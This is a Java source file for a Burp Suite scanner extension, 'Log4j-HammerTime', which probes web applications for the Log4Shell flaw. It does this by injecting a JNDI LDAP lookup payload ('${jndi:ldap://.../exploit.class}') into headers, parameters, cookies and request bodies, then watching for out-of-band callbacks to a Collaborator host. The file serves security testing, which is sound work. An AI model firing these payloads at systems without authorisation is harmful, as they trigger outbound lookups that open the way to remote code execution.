/*
 * Copyright (c) 2021, Frederic Vleminckx.
 *
 * Use of this source code is governed by an MIT-style
 * license that can be found in the LICENSE file or at
 * https://opensource.org/licenses/MIT.
 */

package burp;

import java.awt.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Timestamp;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import javax.swing.*;

import static burp.IScannerInsertionPoint.*;

public class BurpExtender implements IBurpExtender, IScannerCheck, ITab {
    private static final String name = "Log4j-HammerTime";
    private static final String version = "1.0";

    private PrintWriter stdout;
    private PrintWriter stderr;

    private static IBurpExtenderCallbacks callbacks;
    private static IExtensionHelpers helpers;

    public static final String LOG4J_PAYLOAD = "${jndi:ldap://%s/exploit.class}";

    private IBurpCollaboratorClientContext collaboratorContext;
    private ConcurrentHashMap<String, TimedRequestResponse> processedRequestResponse = new ConcurrentHashMap<String, TimedRequestResponse>();
    private InteractionServer interactionServer;

    private ArrayList<String> additionalHeaders;

    //
    // implement IBurpExtender
    //
    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        // keep a reference to our callbacks object
        this.callbacks = callbacks;
        
        // obtain an extension helpers object
        helpers = callbacks.getHelpers();
        
        // set our extension name
        callbacks.setExtensionName(name);

        // Initialize stdout and stderr
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);

        // register ourselves as a custom scanner check
        stdout.println("[+] Starting " + name + " " + version + "...");
        callbacks.registerScannerCheck(this);

        //callbacks.addSuiteTab(this);

        // Load additional headers to check
        additionalHeaders = loadAdditionalHeaders();
        for (String additionalHeader:additionalHeaders) {
            stdout.println("[+] Loaded additional header: " + additionalHeader);
        }

        // Add Burp collab context
        collaboratorContext = callbacks.createBurpCollaboratorClientContext();

        interactionServer = new InteractionServer(callbacks, this.processedRequestResponse, this.collaboratorContext);
        new Thread(interactionServer).start();
        callbacks.registerExtensionStateListener(interactionServer);
    }

    //
    // implement IScannerCheck
    //
    
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        // No passive scanner extension
        return null;
    }

    private static final boolean isValidInsertionPointType(byte insertionPointType) {
        return insertionPointType == INS_HEADER ||
                insertionPointType == INS_PARAM_NAME_BODY ||
                insertionPointType == INS_PARAM_BODY ||
                insertionPointType == INS_PARAM_COOKIE ||
                insertionPointType == INS_PARAM_JSON ||
                insertionPointType == INS_ENTIRE_BODY ||
                insertionPointType == INS_PARAM_NAME_URL ||
                insertionPointType == INS_PARAM_URL;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // type of insertion point
        if(isValidInsertionPointType(insertionPoint.getInsertionPointType())) {
            // stdout.println("[+] Type of injection point: " + insertionPoint.getInsertionPointType() + ".");
            // Generate many HTTP request per insertionPoint: original + (original * every additional header)
            for(Map.Entry<String, byte[]> entry : generateHttpRequests(insertionPoint).entrySet()) {

                // note: a successful exploit results in timeout of the response. Hence, the workaround with HttpRequestWithoutResponse
                processedRequestResponse.put(entry.getKey(),
                        new TimedRequestResponse(new Timestamp(System.currentTimeMillis()),callbacks.saveBuffersToTempFiles(new HttpRequestWithoutResponse(baseRequestResponse.getHttpService(), entry.getValue()))));

                IHttpRequestResponse response = callbacks.makeHttpRequest(
                        baseRequestResponse.getHttpService(), entry.getValue());
            }
        }
        return null;
    }
    
    private HashMap<String, byte[]> generateHttpRequests(IScannerInsertionPoint insertionPoint) {
        HashMap<String, byte[]> httpRequests = new HashMap<String, byte[]>();

        // Initial insertion point
        String interactionID = collaboratorContext.generatePayload(false);
        String currentCollaboratorPayload = String.format(LOG4J_PAYLOAD, interactionID + "." + collaboratorContext.getCollaboratorServerLocation());
        byte[] payloadRequest = insertionPoint.buildRequest(currentCollaboratorPayload.getBytes());
        httpRequests.put(interactionID, payloadRequest);

        // Foreach Additional Header
        for (String additionalHeader: additionalHeaders) {
            interactionID = collaboratorContext.generatePayload(false);
            currentCollaboratorPayload = String.format(LOG4J_PAYLOAD, interactionID + "." + collaboratorContext.getCollaboratorServerLocation());
            //stdout.println("[+] Collaborator interaction " + interactionID + ".");
            httpRequests.put(interactionID, addOrReplaceHeader(payloadRequest,additionalHeader,currentCollaboratorPayload));
        }
        return httpRequests;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (isDuplicatedIssue(existingIssue,newIssue))
            return -1;
        return 0;
    }

    public static boolean isDuplicatedIssue(IScanIssue existingIssue, IScanIssue newIssue) {
        return (existingIssue.getIssueName().equals(newIssue.getIssueName()) &&
                existingIssue.getUrl().equals(newIssue.getUrl()));
    }

    public static boolean hasDuplicatedIssue(IScanIssue[] existingIssues, IScanIssue newIssue) {
        for (IScanIssue existingIssue : existingIssues) {
            if(isDuplicatedIssue(existingIssue,newIssue))
                return true;
        }
        return false;
    }

    public static byte[] addOrReplaceHeader(byte[] request, String header, String value) {
        try {
            int i = 0;
            int end = request.length;
            while (i < end && request[i++] != '\n') {
            }
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

            while (i < end) {
                int line_start = i;
                while (i < end && request[i++] != ' ') {
                }
                byte[] header_name = Arrays.copyOfRange(request, line_start, i - 2);
                int headerValueStart = i;
                while (i < end && request[i++] != '\n') {
                }
                if (i == end) {
                    break;
                }

                if(i+2<end && request[i] == '\r' && request[i+1] == '\n') {
                    outputStream.write(Arrays.copyOfRange(request, 0, i));
                    outputStream.write(helpers.stringToBytes(header + ": " + value+"\r\n"));
                    outputStream.write(Arrays.copyOfRange(request, i, end));
                    return outputStream.toByteArray();
                }

                String header_str = helpers.bytesToString(header_name);

                if (header.equals(header_str)) {

                    outputStream.write(Arrays.copyOfRange(request, 0, headerValueStart));
                    outputStream.write(helpers.stringToBytes(value));
                    outputStream.write(Arrays.copyOfRange(request, i-2, end));
                    return outputStream.toByteArray();
                }
            }
            outputStream.write(Arrays.copyOfRange(request, 0, end-2));
            outputStream.write(helpers.stringToBytes(header + ": " + value+"\r\n\r\n"));
            return outputStream.toByteArray();

        } catch (IOException e) {
            throw new RuntimeException("Request creation unexpectedly failed");
        }
    }

    private ArrayList<String> loadAdditionalHeaders() {
        ArrayList<String> result = new ArrayList<String>();

        Scanner s = new Scanner(getClass().getResourceAsStream("/headers"));
        while (s.hasNextLine()) {
            String injection = s.nextLine();
            if (injection.charAt(0) == '#') {
                continue;
            }
            result.add(injection);
        }
        s.close();

        return result;
    }

    @Override
    public String getTabCaption() {
        return name;
    }

    @Override
    public Component getUiComponent() {
        Component panel = new JPanel(new BorderLayout());
        return panel;
    }
}

class HttpRequestWithoutResponse implements IHttpRequestResponse{

    private IHttpService service;
    private byte[] request;
    private String comment;
    private String highlight;

    public HttpRequestWithoutResponse(IHttpService service, byte[] request){

        this.service = service;
        this.request = request;
    }

    @Override
    public byte[] getRequest() {
        return request;
    }

    @Override
    public void setRequest(byte[] request) {
        this.request=request;
    }

    @Override
    public byte[] getResponse() {
        return null;
    }

    @Override
    public void setResponse(byte[] message) {

    }

    @Override
    public String getComment() {
        return comment;
    }

    @Override
    public void setComment(String comment) {
        this.comment=comment;
    }

    @Override
    public String getHighlight() {
        return highlight;
    }

    @Override
    public void setHighlight(String highlight) {
        this.highlight=highlight;
    }

    @Override
    public IHttpService getHttpService() {
        return service;
    }

    @Override
    public void setHttpService(IHttpService httpService) {
        this.service=httpService;
    }
}